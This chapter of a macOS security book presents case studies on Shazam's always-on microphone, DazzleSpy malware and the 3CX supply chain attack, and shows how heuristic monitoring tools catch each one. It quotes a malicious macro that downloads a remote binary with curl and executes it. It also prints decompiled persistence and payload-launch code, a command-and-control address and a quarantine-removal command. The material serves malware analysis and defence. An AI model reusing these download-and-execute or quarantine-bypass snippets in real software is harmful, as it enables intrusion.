<html><head></head><body>
<div id="book-content">
<div id="sbo-rt-content"><section epub:type="chapter" role="doc-chapter" aria-labelledby="ch14">&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_313" aria-label="313"/>&#13;
<hgroup>&#13;
&#13;
<h2 class="CHAPTER" id="ch14">&#13;
<span class="CN"><span class="SANS_Futura_Std_Bold_Condensed_B_11">14</span></span>&#13;
<span class="CT"><span class="Sans_Dogma_B">CASE STUDIES</span></span>&#13;
</h2>&#13;
</hgroup>&#13;
<figure class="opener"><img class="opener" src="../images/opener.jpg" alt="" width="377" height="376"/></figure>&#13;
<p class="CO">In this final chapter, I showcase a handful of case studies, ranging from good apps misbehaving to sophisticated nation-state attacks. In each case, I’ll demonstrate exactly how the heuristic-based detection approaches discussed throughout this book succeed at uncovering the threat, even without prior knowledge of it.</p>&#13;
<section epub:type="division" aria-labelledby="sec1">&#13;
&#13;
<h3 class="H1" id="sec1"><span id="h1-79"/><span class="SANS_Futura_Std_Bold_B_11">Shazam’s Mic Access</span></h3>&#13;
<p class="TNI">About a year after the release of OverSight, the webcam and mic monitor detailed in <span class="Xref"><a href="chapter12.xhtml">Chapter 12</a></span>, I received an email from a user named Phil, who wrote the following: “Thanks to OverSight, I was able to figure out why my mic was always spying on me. Just to let you know, the Shazam widget keeps the microphone active even when you specifically switch the toggle to OFF in their app.”</p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_314" aria-label="314"/>Shazam, an app that became popular in the mid-2010s, identifies the name and artist of a song while it plays. To confirm Phil’s bold claim (and rule out any bugs in OverSight), I decided to investigate the issue. I installed Shazam on my Mac, then toggled it on, instructing it to listen. Unsurprisingly, this generated an OverSight event indicating that Shazam had activated the computer’s built-in microphone.</p>&#13;
<p class="TX">I then toggled Shazam off. Instead of displaying the expected deactivation alert, OverSight displayed nothing. To determine whether Shazam was indeed still listening, I reverse engineered the app. Examining Shazam’s binary code revealed a core class named <span class="SANS_TheSansMonoCd_W5Regular_11">SHKAudioRecorder</span> and seemingly relevant methods named <span class="SANS_TheSansMonoCd_W5Regular_11">isRecording</span> and <span class="SANS_TheSansMonoCd_W5Regular_11">stopRecording</span>. In the following debugger output, you can see that I encountered an instance of this class at the memory address 0x100729040. We can introspect this <span class="SANS_TheSansMonoCd_W5Regular_11">SHKAudioRecorder</span> object, and even directly invoke its methods or inspect its properties, to see whether Shazam is indeed still recording:</p>&#13;
&#13;
<pre><code>(lldb) <b>po [0x100729040 className]</b>&#13;
SHKAudioRecorder&#13;
&#13;
(lldb) <b>p (BOOL)[0x100729040 isRecording]</b>&#13;
(BOOL) $19 = YES&#13;
</code></pre>&#13;
<p class="TX">Continued analysis revealed that, to stop recording, the <span class="SANS_TheSansMonoCd_W5Regular_11">stopRecording</span> method would invoke Apple’s Core Audio <span class="SANS_TheSansMonoCd_W5Regular_11">AudioOutputUnitStop</span> function. So far, so good. However, further investigation appeared to show that Shazam never actually called this method when users toggled off the recording. This strongly implied that Shazam kept the mic active and listening! Indeed, as shown in the debugger output, querying the <span class="SANS_TheSansMonoCd_W5Regular_11">isRecording</span> property after toggling Shazam off shows it still set to <span class="SANS_TheSansMonoCd_W5Regular_11">YES</span>, the Objective-C value for true.</p>&#13;
<p class="TX">Apparently, when Shazam’s marketing materials claimed the app would “lend its ears to your Mac,” they weren’t kidding! I reached out to the company, who told me that this undocumented behavior was part of the app’s design, and actually benefited the user:</p>&#13;
<blockquote>&#13;
<p class="EXO">Thanks for getting in touch and bringing this to our attention. The iOS and Mac apps use a shared SDK, hence the continued recording you are seeing on Mac. We use this continued recording on iOS for performance, allowing us to deliver faster song matches to users.</p>&#13;
</blockquote>&#13;
<p class="TX">While Shazam initially ignored my concerns, it changed its mind once the media got involved, running pieces with headlines such as “Shazam is always listening to everything you’re doing”<sup><a role="doc-noteref" id="chapter14_1" href="#chapter14-1">1</a></sup> and “Shhh! Shazam is always listening—even when it’s been switched ‘off.’ ”<sup><a role="doc-noteref" id="chapter14_2" href="#chapter14-2">2</a></sup> In response, Shazam pushed out an update that turned off the microphone when the app was toggled off.<sup><a role="doc-noteref" id="chapter14_3" href="#chapter14-3">3</a></sup> (Apparently, though, there really is no such thing as bad publicity; the following year, Apple acquired Shazam for $400 million.)</p>&#13;
<p class="TX">I designed OverSight to detect malware with mic and webcam spying capabilities, such as FruitFly, Crisis, and Mokes, but its malware-agnostic, <span role="doc-pagebreak" epub:type="pagebreak" id="pg_315" aria-label="315"/>heuristic-based approach has proven extremely versatile, capable also of identifying a major privacy issue.</p>&#13;
<p class="TX">Next, we’ll consider a more conventional example of malware detection.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec2">&#13;
&#13;
<h3 class="H1" id="sec2"><span id="h1-80"/><span class="SANS_Futura_Std_Bold_B_11">DazzleSpy Detection</span></h3>&#13;
<p class="TNI">DazzleSpy, a malicious specimen mentioned throughout the book, makes for a great case study, as it’s not your average, run-of-the-mill malware. This sophisticated, persistent backdoor used zero-day exploits to infect individuals supporting pro-democracy causes in Hong Kong.<sup><a role="doc-noteref" id="chapter14_4" href="#chapter14-4">4</a></sup> Intrigued by the malware, I performed my own analysis of it<sup><a role="doc-noteref" id="chapter14_5" href="#chapter14-5">5</a></sup> and then considered how security tools could have defended against it and other sophisticated macOS threats.</p>&#13;
<section epub:type="division" aria-labelledby="sec3">&#13;
&#13;
<h4 class="H2" id="sec3"><span id="h2-101"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Exploit Detection</span></h4>&#13;
<p class="TNI">The tools and techniques presented in this book have predominantly focused on detecting malware once it has found its way onto a macOS system. However, these approaches can often detect the malware’s initial exploitation vector as well. For example, a process monitor that builds process hierarchies may be able to detect an exploited browser or word processor spawning a malicious child process. This heuristic-based approach to exploit detection is especially important, as advanced threat actors increasingly deploy their malware via exploits.</p>&#13;
<p class="TX">Before we focus on DazzleSpy’s exploits, let’s consider an attack that leveraged a malicious document. Attributed to North Korean nation-state hackers,<sup><a role="doc-noteref" id="chapter14_6" href="#chapter14-6">6</a></sup> the Word file contained macro code capable of exploiting a macOS system to persistently install a backdoor. Here is a snippet of the malicious code:</p>&#13;
&#13;
<pre><code>sur = "https://nzssdm.com/assets/mt.dat"&#13;
spath = "/tmp/"&#13;
i = 0&#13;
&#13;
Do&#13;
    spath = spath &amp; Chr(Int(Rnd * 26) + 97)&#13;
    i = i + 1&#13;
Loop Until i &gt; 12&#13;
&#13;
system("curl -o " &amp; spath &amp; " " &amp; sur)&#13;
system("chmod +x " &amp; spath)&#13;
popen(spath, "r")&#13;
</code></pre>&#13;
<p class="TX">You can see that the malicious macro downloads a remote binary, <i>mt.dat</i>, via <span class="SANS_TheSansMonoCd_W5Regular_11">curl</span>, sets it to be executable, then spawns it using the <span class="SANS_TheSansMonoCd_W5Regular_11">popen</span> API. Because the malicious macro executes in the context of Word, a process monitor will show <span class="SANS_TheSansMonoCd_W5Regular_11">curl</span>, <span class="SANS_TheSansMonoCd_W5Regular_11">chmod</span>, and <i>mt.dat</i> as children of Word. This, of course, is highly anomalous and indicative of an attack.</p>&#13;
<p class="TX">In the case of DazzleSpy, the exploit chain is far more complex, but it still offers several chances for detection. As part of the chain, an in-memory Mach-O executable code downloads the DazzleSpy backdoor to the <span role="doc-pagebreak" epub:type="pagebreak" id="pg_316" aria-label="316"/><i>$TMPDIR/airportpaird</i> directory. After making the backdoor executable, it uses a privilege escalation exploit to remove the <span class="SANS_TheSansMonoCd_W5Regular_11">com.apple.quarantine</span> extended attribute. This action ensures that the operating system will allow the binary to execute without prompts or alerts, even though it isn’t notarized.</p>&#13;
<p class="TX">As the malicious website hosting the exploit chain is long gone, it’s hard to test our detections directly unless we set up our own server hosting the same exploits. Still, a security tool leveraging Endpoint Security events should be able to readily observe and even thwart many actions taken by the exploit that deployed DazzleSpy. For example, as <span class="Xref"><a href="chapter9.xhtml">Chapter 9</a></span> showed, the <span class="SANS_TheSansMonoCd_W5Regular_11">ES_EVENT_TYPE_AUTH_EXEC</span> event type provides a mechanism to authenticate process executions, perhaps blocking any that aren’t notarized, especially if the parent is the browser.</p>&#13;
<p class="TX">Other Endpoint Security events related to the deletion of extended attributes could catch or even block any process attempting to delete <span class="SANS_TheSansMonoCd_W5Regular_11">com.apple.quarantine</span>. The example code in <a href="chapter14.xhtml#Lis14-1">Listing 14-1</a> monitors one of these events, <span class="SANS_TheSansMonoCd_W5Regular_11">ES_EVENT_TYPE_NOTIFY_DELETEEXTATTR</span>, to detect any removal of any extended attribute.</p>&#13;
<span id="Lis14-1"/>&#13;
<pre><code>es_client_t* client = NULL;&#13;
es_event_type_t events[] = {ES_EVENT_TYPE_NOTIFY_DELETEEXTATTR}; <span class="codewide_CodeAnnotation" aria-label="annotation1">❶</span>&#13;
&#13;
es_new_client(&amp;client, ^(es_client_t* client, const es_message_t* message) {&#13;
    if(ES_EVENT_TYPE_NOTIFY_DELETEEXTATTR == message-&gt;event_type) { <span class="codewide_CodeAnnotation" aria-label="annotation2">❷</span>&#13;
        es_string_token_t* procPath = &amp;message-&gt;process-&gt;executable-&gt;path;&#13;
        es_string_token_t* filePath = &amp;message-&gt;event.deleteextattr.target-&gt;path;&#13;
        const es_string_token_t* extAttr = &amp;message-&gt;event.deleteextattr.extattr;&#13;
&#13;
        printf("ES_EVENT_TYPE_NOTIFY_DELETEEXTATTR\n");&#13;
        printf("xattr: %.*s\n", (int)extAttr-&gt;length, extAttr-&gt;data);&#13;
        printf("target file path: %.*s\n", (int)filePath-&gt;length, filePath-&gt;data);&#13;
        printf("responsible process: %.*s\n", (int)procPath-&gt;length, procPath-&gt;data);&#13;
    }&#13;
});&#13;
es_subscribe(client, events, sizeof(events)/sizeof(events[0]));&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 14-1: Detecting the removal of the quarantine attribute</span></p>&#13;
<p class="TX">We first specify the event of interest, <span class="SANS_TheSansMonoCd_W5Regular_11">ES_EVENT_TYPE_NOTIFY_DELETEEXTATTR</span>, which will notify us of the removal of any extended attributes <span class="CodeAnnotation" aria-label="annotation1">❶</span>. (You could also use the authorization event <span class="SANS_TheSansMonoCd_W5Regular_11">ES_EVENT_TYPE_AUTH_DELETEEXTATTR</span> to block the removal altogether.) This notification event will trigger the callback block <span class="CodeAnnotation" aria-label="annotation2">❷</span>, where we extract the responsible process, its filepath, and any extended attributes that the code deleted. We can extract this information from a structure named <span class="SANS_TheSansMonoCd_W5Regular_11">deleteextattr</span> found in the Endpoint Security event. This structure, of type <span class="SANS_TheSansMonoCd_W5Regular_11">es_event_deleteextattr_t</span>, is defined in <i>ESMessage.h</i> and has the following members:</p>&#13;
&#13;
<pre><code>typedef struct {&#13;
    es_file_t* _Nonnull target;&#13;
    es_string_token_t extattr;&#13;
    uint8_t reserved[64];&#13;
} es_event_deleteextattr_t&#13;
</code></pre>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_317" aria-label="317"/>When downloaded, whether through a browser exploit chain or manually, DazzleSpy’s <span class="SANS_TheSansMonoCd_W5Regular_11">airportpaird</span> binary will have the <span class="SANS_TheSansMonoCd_W5Regular_11">com.apple.quarantine</span> extended attribute set. You can confirm this with the <span class="SANS_TheSansMonoCd_W5Regular_11">xattr</span> command, executed with the <span class="SANS_TheSansMonoCd_W5Regular_11">-l</span> command line flag:</p>&#13;
&#13;
<pre><code>% <b>xattr -l airportpaird</b>&#13;
com.apple.quarantine: 0083;659e4224;Safari;D6E57863-A216-4B5B-ADE8-2ECB300E2075&#13;
</code></pre>&#13;
<p class="TX">To manually mimic the exploit, delete this attribute by running <span class="SANS_TheSansMonoCd_W5Regular_11">xattr</span> with the <span class="SANS_TheSansMonoCd_W5Regular_11">-d</span> flag:</p>&#13;
&#13;
<pre><code>% <b>xattr -d com.apple.quarantine airportpaird</b></code></pre>&#13;
<p class="TX">If the monitoring code we wrote in <a href="chapter14.xhtml#Lis14-1">Listing 14-1</a> is running, you’ll receive the following alert:</p>&#13;
&#13;
<pre><code># <b>XattrMonitor.app/Contents/MacOS/XattrMonitor</b>&#13;
ES_EVENT_TYPE_NOTIFY_DELETEEXTATTR&#13;
xattr: com.apple.quarantine&#13;
target file path: /var/folders/l2/fsx0dkdx3jq6w71cqsht2p240000gn/T/airportpaird&#13;
responsible process: /usr/bin/xattr&#13;
</code></pre>&#13;
<p class="TX">Many other malware samples remove the <span class="SANS_TheSansMonoCd_W5Regular_11">com.apple.quarantine</span> extended attribute, including CoinTicker, OceanLotus, and XCSSET.<sup><a role="doc-noteref" id="chapter14_7" href="#chapter14-7">7</a></sup> It’s worth noting, however, that legitimate applications, such as installers, may also remove this attribute, so you shouldn’t treat a single observation as the sole reason for classifying an item as malicious.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec4">&#13;
&#13;
<h4 class="H2" id="sec4"><span id="h2-102"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Persistence</span></h4>&#13;
<p class="TNI">It’s also easy to detect DazzleSpy by taking a behavior-based approach focusing on the malware’s persistence and network access. Let’s start by detecting its persistence, one of the best ways to detect malware. The following decompilation shows DazzleSpy’s <span class="SANS_TheSansMonoCd_W5Regular_11">installDaemon</span> method installing and persisting it as a launch agent:</p>&#13;
&#13;
<pre><code>+(void)installDaemon {&#13;
    ...&#13;
    rax = NSHomeDirectory();&#13;
    var_30 = [[NSString stringWithFormat:@"%@/.local", rax] retain];&#13;
    var_38 = [[NSString stringWithFormat:@"%@/softwareupdate", var_30] retain];&#13;
    rax = [[NSBundle mainBundle] executablePath];&#13;
    var_58 = [NSURL fileURLWithPath:rax];&#13;
    var_60 = [NSData dataWithContentsOfURL:var_58];&#13;
&#13;
    [var_60 writeToFile:var_38 atomically:0x1];&#13;
&#13;
    var_78 = [NSString stringWithFormat:@"%@/Library/LaunchAgents", rax];&#13;
    var_80 = [var_78 stringByAppendingFormat:@"/com.apple.softwareupdate.plist"];&#13;
&#13;
    var_90 = [[NSMutableDictionary alloc] init];&#13;
    var_98 = [[NSMutableArray alloc] init];&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_318" aria-label="318"/>    [var_98 addObject:var_38];&#13;
    [var_98 addObject:@"1"];&#13;
    rax = @(YES);&#13;
    [var_90 setObject:rax forKey:@"RunAtLoad"];&#13;
    [var_90 setObject:rax forKey:@"KeepAlive"];&#13;
    [var_90 setObject:@"com.apple.softwareupdate" forKey:@"Label"];&#13;
    [var_90 setObject:var_98 forKey:@"ProgramArguments"];&#13;
&#13;
    [var_90 writeToFile:var_80 atomically:0x0];&#13;
</code></pre>&#13;
<p class="TX">You can see that malware first makes a copy of itself to <i>~/.local/softwareupdate</i>, then persists this copy by using the <i>com.apple.softwareupdate.plist</i> launch agent property list.</p>&#13;
<p class="TX">A file monitor that has subscribed to file I/O Endpoint Security events such as <span class="SANS_TheSansMonoCd_W5Regular_11">ES_EVENT_TYPE_NOTIFY_CREATE</span> can easily observe this behavior and detect DazzleSpy when it persists. For example, here is the output of the file monitor discussed in <span class="Xref"><a href="chapter8.xhtml">Chapter 8</a></span>:</p>&#13;
&#13;
<pre><code># <b>FileMonitor.app/Contents/MacOS/FileMonitor -pretty</b>&#13;
...&#13;
{&#13;
  "event" : "ES_EVENT_TYPE_NOTIFY_CREATE",&#13;
  "file" : {&#13;
    "destination" : "/Users/User/Library/LaunchAgents/com.apple.softwareupdate.plist",&#13;
    "process" : {&#13;
      "pid" : 1469,&#13;
      "name" : airportpaird,&#13;
      "path" : "/var/folders/l2/fsx0dkdx3jq6w71cqsht2p240000gn/T/airportpaird"&#13;
    }&#13;
  }&#13;
}&#13;
</code></pre>&#13;
<p class="TX">Once DazzleSpy has persisted, we can also view the contents of its <i>com.apple.softwareupdate.plist</i> launch agent property list:</p>&#13;
&#13;
<pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;&#13;
...&#13;
&lt;plist version="1.0"&gt;&#13;
&lt;dict&gt;&#13;
    &lt;key&gt;KeepAlive&lt;/key&gt;&#13;
    &lt;true/&gt;&#13;
    &lt;key&gt;Label&lt;/key&gt;&#13;
    &lt;string&gt;com.apple.softwareupdate&lt;/string&gt;&#13;
    &lt;key&gt;ProgramArguments&lt;/key&gt;&#13;
    &lt;array&gt;&#13;
        &lt;string&gt;/Users/User/.local/softwareupdate&lt;/string&gt;&#13;
        &lt;string&gt;1&lt;/string&gt;&#13;
    &lt;/array&gt;&#13;
    &lt;key&gt;RunAtLoad&lt;/key&gt;&#13;
    &lt;true/&gt;&#13;
    &lt;key&gt;SuccessfulExit&lt;/key&gt;&#13;
    &lt;true/&gt;&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_319" aria-label="319"/>&lt;/dict&gt;&#13;
&lt;/plist&gt;&#13;
</code></pre>&#13;
<p class="TX">The <span class="SANS_TheSansMonoCd_W5Regular_11">ProgramArguments</span> key confirms the path to the persistence location of the malicious binary we saw in the decompilation. Also, you can see that the <span class="SANS_TheSansMonoCd_W5Regular_11">RunAtLoad</span> key is set to true, meaning that each time the user logs in (at which point the operating system examines launch agents), macOS will automatically restart the malware.</p>&#13;
<p class="TX">BlockBlock could easily detect this persistence via Endpoint Security file events or the newer <span class="SANS_TheSansMonoCd_W5Regular_11">ES_EVENT_TYPE_NOTIFY_BTM_LAUNCH_ITEM_ADD</span> event. Also, because traditional antivirus products have improved their detections, KnockKnock’s VirusTotal integrations will now highlight DazzleSpy as malicious, but even if the antivirus signatures failed to flag DazzleSpy as malware (as they did when the malware was initially deployed), KnockKnock could detect DazzleSpy’s persistent launch agent, as its Background Task Management plug-in reveals all installed launch items.</p>&#13;
<p class="TX">Furthermore, notice the <i>com.apple</i> prefix to the property list, which suggests that the binary is an Apple updater. Apple hasn’t signed the item, however; in fact, the binary is wholly unsigned. (KnockKnock indicates this by showing a question mark next to the item’s name.) Taking all this information into consideration, we can conclude that the item is likely malicious and requires thorough investigation.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec5">&#13;
&#13;
<h4 class="H2" id="sec5"><span id="h2-103"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Network Access</span></h4>&#13;
<p class="TNI">Unauthorized network access is yet another great way to detect malware, and DazzleSpy is no exception. To receive tasking, DazzleSpy connects to the attacker’s command-and-control server at 88.218.192.128. The following snippet of decompilation shows this address is hardcoded into the malware, along with the port, 5633:</p>&#13;
&#13;
<pre><code>int main(int argc, const char* argv[]) {&#13;
    ...&#13;
    var_18 = [[NSString alloc] initWithUTF8String:"88.218.192.128:5633"];&#13;
</code></pre>&#13;
<p class="TX">A network monitor like LuLu, which uses the techniques mentioned in <span class="Xref"><a href="chapter7.xhtml">Chapter 7</a></span>, could easily detect this network access. In its alert, LuLu would capture the unauthorized <i>softwareupdate</i> program’s attempt to connect to a remote server listening on a nonstandard port. It would also show that the program isn’t signed with a trusted certificate or notarized and that it runs from a hidden directory. Put together, these red flags certainly warrant a closer inspection.</p>&#13;
</section>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec6">&#13;
&#13;
<h3 class="H1" id="sec6"><span id="h1-81"/><span class="SANS_Futura_Std_Bold_B_11">The 3CX Supply Chain Attack</span></h3>&#13;
<p class="TNI">This last case study pits our tools and techniques against what are widely considered to be some of the most challenging attacks to detect: supply <span role="doc-pagebreak" epub:type="pagebreak" id="pg_320" aria-label="320"/>chain attacks. These damaging cybersecurity incidents can infect a massive number of unsuspecting users by compromising trusted software. Although most supply chain attacks impact Windows-based computers, there has been a noticeable uptick of such attacks against the open source community<sup><a role="doc-noteref" id="chapter14_8" href="#chapter14-8">8</a></sup> and macOS. Here, we’ll focus on the 2023 nation-state attack discussed several times in the book, which targeted the popular private branch exchange (PBX) software provider 3CX.</p>&#13;
<p class="TX">Believed to be the first <i>chained</i> supply chain attack (in which the attackers gained initial access to 3CX through a separate supply chain attack), attackers subverted both the Windows and Mac versions of 3CX’s application. The attackers then signed the trojanized application with 3CX’s own developer certificate and submitted it to Apple, which inadvertently notarized it. Finally, macOS enterprise users downloaded the subverted application en masse, without suspecting that anything was amiss.</p>&#13;
<p class="TX">Supply chain attacks are incredibly difficult to detect. The legitimate macOS 3CX application contained more than 400MB of code spread across more than 100 files, so identifying a malicious component to confirm its subversion was like searching for a needle in a haystack. You can read more about this search in my write-up, where I both confirmed the subversion of the macOS app and pinpointed the single library within the app that hosted the attacker’s malicious code.<sup><a role="doc-noteref" id="chapter14_9" href="#chapter14-9">9</a></sup></p>&#13;
<p class="TX">Understandably, even large cybersecurity companies struggle with such detections: SentinelOne initially noted that it couldn’t confirm whether the macOS version of the 3CX app was impacted by the attack.<sup><a role="doc-noteref" id="chapter14_10" href="#chapter14-10">10</a></sup> Also, Apple’s scans missed the subversion of the infected installer, resulting in the inadvertent granting of a notarization ticket.</p>&#13;
<p class="TX">Still, it’s quite possible to detect supply chain attacks by observing anomalous or unusual behaviors. CrowdStrike, the first organization to confirm the 3CX attack on Windows,<sup><a role="doc-noteref" id="chapter14_11" href="#chapter14-11">11</a></sup> used this behavior-based approach.<sup><a role="doc-noteref" id="chapter14_12" href="#chapter14-12">12</a></sup> Let’s consider the detection methods that could uncover this and other supply chain attacks. When taken together, various anomalies paint a very clear picture that something is amiss.</p>&#13;
<section epub:type="division" aria-labelledby="sec7">&#13;
&#13;
<h4 class="H2" id="sec7"><span id="h2-104"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">File Monitoring</span></h4>&#13;
<p class="TNI">The malicious code added to the 3CX app’s legitimate <i>libffmpeg.dylib</i> library had two simple goals: gather information about the infected host, then download and execute a second-stage payload. As part of the first activity, the malware also generated an identifier to uniquely identify the infected host and wrote it to a hidden, encrypted file, <i>.main_storage</i>.<sup><a role="doc-noteref" id="chapter14_13" href="#chapter14-13">13</a></sup> Here is a snippet of decompilation from a function in the subverted <i>libffmpeg.dylib</i> library that opens the file, encrypts the information, and then writes it to disk:</p>&#13;
&#13;
<pre><code><span class="Code_CodeAnnotation" aria-label="annotation1">❶</span> rax = fopen(file, "wb");&#13;
if (rax != 0x0) {&#13;
    rbx = rax;&#13;
    rax = 0x0;&#13;
  <span class="Code_CodeAnnotation" aria-label="annotation2">❷</span> do {&#13;
        *(r14 + rax) = *(r14 + rax) ^ 0x7a;&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_321" aria-label="321"/>        rax = rax + 0x1;&#13;
    } while (rax != 0x38);&#13;
&#13;
  <span class="Code_CodeAnnotation" aria-label="annotation3">❸</span> fwrite(r14, 0x38, 0x1, rbx);&#13;
    fflush(rbx);&#13;
    fclose(rbx);&#13;
}&#13;
</code></pre>&#13;
<p class="TX">In the decompilation, you can see the file being opened with the <span class="SANS_TheSansMonoCd_W5Regular_11">fopen</span> API <span class="CodeAnnotation" aria-label="annotation1">❶</span>. The filename is hardcoded in the malware but not shown in the decompilation, as the code dynamically creates the full path and then passes it into the function. Once it has opened the file, the malware XOR encrypts a buffer pointed to by the <span class="SANS_TheSansMonoCd_W5Regular_11">r14</span> register using a hardcoded key, <span class="SANS_TheSansMonoCd_W5Regular_11">0x7a</span> <span class="CodeAnnotation" aria-label="annotation2">❷</span>. Then it writes the encrypted buffer to the file with the <span class="SANS_TheSansMonoCd_W5Regular_11">fwrite</span> API <span class="CodeAnnotation" aria-label="annotation3">❸</span>.</p>&#13;
<p class="TX">Using a file monitor, you could observe the malware opening and writing to this hidden file:</p>&#13;
&#13;
<pre><code># <b>FileMonitor.app/Contents/MacOS/FileMonitor -pretty -filter </b><b>"</b><b>3CX Desktop App</b><b>"</b>&#13;
{&#13;
  "event" : "ES_EVENT_TYPE_NOTIFY_CREATE",&#13;
  "file" : {&#13;
    "destination" :&#13;
    "/Users/User/Library/Application Support/3CX Desktop App/.main_storage",&#13;
    "process" : {&#13;
      "pid" : 40029,&#13;
      "name" : "3CX Desktop App",&#13;
      "path" : "\/Applications/3CX Desktop App\/Contents\/MacOS\/3CX Desktop App"&#13;
    }&#13;
  }&#13;
}&#13;
...&#13;
{&#13;
  "event" : "ES_EVENT_TYPE_NOTIFY_WRITE",&#13;
  "file" : {&#13;
    "destination" :&#13;
    "/Users/User/Library/Application Support/3CX Desktop App/<b>.main_storage",</b>&#13;
    "process" : {&#13;
      "pid" : 40029,&#13;
      "name" : "3CX Desktop App",&#13;
      "path" : "\/Applications/3CX Desktop App\/Contents\/MacOS\/3CX Desktop App"&#13;
    }&#13;
  }&#13;
}&#13;
</code></pre>&#13;
<p class="TX">If you manually examine <i>.main_storage</i> with the macOS <span class="SANS_TheSansMonoCd_W5Regular_11">hexdump</span> utility, you can see that it clearly appears obfuscated or encrypted:</p>&#13;
&#13;
<pre><code># <b>hexdump -C ~/Library/Application\ Support/3CX\ Desktop\ App/.main_storage</b>&#13;
00000000  1c 19 1e 4f 1f 43 4e 1b  57 1b 1b 4c 43 57 49 43  |...O.CN.W..LCWIC|&#13;
00000010  49 1c 57 4f 49 1f 4e 57  4f 1f 4b 4a 4f 4d 1b 4c  |I.WOI.NWO.KJOM.L|&#13;
00000020  4b 4c 1c 4b 7a 7a 7a 7a  7a 7a 7a 7a 7a 7a 7a 7a  |KL.Kzzzzzzzzzzzz|&#13;
00000030  05 0c ee 1e 7a 7a 7a 7a&#13;
</code></pre>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_322" aria-label="322"/>By flagging the creation of hidden files, especially those that contain encrypted content, we’d quickly notice that the 3CX application was acting very strangely. One way to detect that a file is encrypted is to compute the file’s entropy. This process is computationally intensive, so we wouldn’t want to do this for every file, but checking hidden files might be a good start!</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec8">&#13;
&#13;
<h4 class="H2" id="sec8"><span id="h2-105"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Network Monitoring</span></h4>&#13;
<p class="TNI">Once the malware has generated an ID for the victim and completed a basic survey of the infected system, it sends this information to its command-and-control server. The resulting network traffic gives us yet another heuristic with which to detect that something is amiss. However, the 3CX application accesses the network to accomplish its legitimate functionality, so to detect its subversion, we’d need to observe it communicating with new, malicious endpoints.</p>&#13;
<p class="TX">In fact, this is how users noticed the supply chain attack in the first place. The first reports of odd behavior appeared on 3CX forums, where customers posted about unusual network traffic emanating from the application. For example, one customer noticed a connection to the <i>msstorageboxes.com</i> DNS host, an unrecognized domain that had just been registered in Reykjavik.<sup><a role="doc-noteref" id="chapter14_14" href="#chapter14-14">14</a></sup> The DNSMonitor tool described in <span class="Xref"><a href="chapter13.xhtml">Chapter 13</a></span> lets us observe this DNS traffic:</p>&#13;
&#13;
<pre><code>% <b>/Applications/DNSMonitor.app/Contents/MacOS/DNSMonitor</b>&#13;
{&#13;
    "Process" : {&#13;
        "pid" : 40029,&#13;
        "name" : "3CX Desktop App",&#13;
        "path" : "\/Applications/3CX Desktop App\/Contents\/MacOS\/3CX Desktop App"&#13;
    },&#13;
    "Packet" : {&#13;
        "Opcode" : "Standard",&#13;
        "QR" : "Query",&#13;
        "Questions" : [&#13;
          {&#13;
            "Question Name" : "1648.3cx.cloud",&#13;
            "Question Class" : "IN",&#13;
            "Question Type" : "AAAA"&#13;
          }&#13;
        ],&#13;
        ...&#13;
    }&#13;
}&#13;
...&#13;
{&#13;
    "Process" : {&#13;
        "pid" : 40029,&#13;
        "name" : "3CX Desktop App",&#13;
        "path" : "\/Applications/3CX Desktop App\/Contents\/MacOS\/3CX Desktop App"&#13;
    },&#13;
    "Packet" : {&#13;
    "QR" : "Query",&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_323" aria-label="323"/>    "Questions" : [&#13;
      }&#13;
        "Question Name" : "msstorageboxes.com",&#13;
        "Question Class" : "IN",&#13;
        ...&#13;
</code></pre>&#13;
<p class="TX">These two requests attempt to resolve the domains <i>1648.3cx.cloud</i> and <i>msstorageboxes.com</i>. How might you classify these endpoints as legitimate or anomalous? As discussed in the previous chapter, general approaches include examining historical DNS records, WHOIS data, and any SSL/TLS certificates.<sup><a role="doc-noteref" id="chapter14_15" href="#chapter14-15">15</a></sup> These data points look normal for the <i>3cx.cloud</i> domain (which is part of 3CX’s infrastructure), but the <i>msstorageboxes.com</i> domain raises some serious red flags.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec9">&#13;
&#13;
<h4 class="H2" id="sec9"><span id="h2-106"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Process Monitoring</span></h4>&#13;
<p class="TNI">Once the malicious code in <i>libffmpeg.dylib</i> has resolved the address of the command-and-control server, it checks in with the server by submitting the generated UUID and basic survey data it has collected from the infected host. Then it downloads and executes a second-stage payload, which provides even more opportunities to heuristically detect this stealthy attack. The following snippet of decompiled code from <i>libffmpeg.dylib</i> shows the malware writing out the second-stage payload and then executing it:</p>&#13;
&#13;
<pre><code><span class="codeannotated_CodeAnnotation" aria-label="annotation1">❶</span> sprintf(&amp;var_21F8, "%s/UpdateAgent", &amp;var_1DF8);&#13;
r13 = &amp;var_21F8;&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation2">❷</span> rax = fopen(r13, "wb");&#13;
if (rax != 0x0) {&#13;
  <span class="Code_CodeAnnotation" aria-label="annotation3">❸</span> fwrite(var_23F8 + 0x4, var_23F8 - 0x4, 0x1, file);&#13;
    ...&#13;
  <span class="Code_CodeAnnotation" aria-label="annotation4">❹</span> chmod(r13, 755o);&#13;
    sprintf(r12, rbp, <span class="Code_CodeAnnotation" aria-label="annotation5">❺</span> r13);&#13;
  <span class="Code_CodeAnnotation" aria-label="annotation6">❻</span> rax = popen(r12, "r");&#13;
    ...&#13;
</code></pre>&#13;
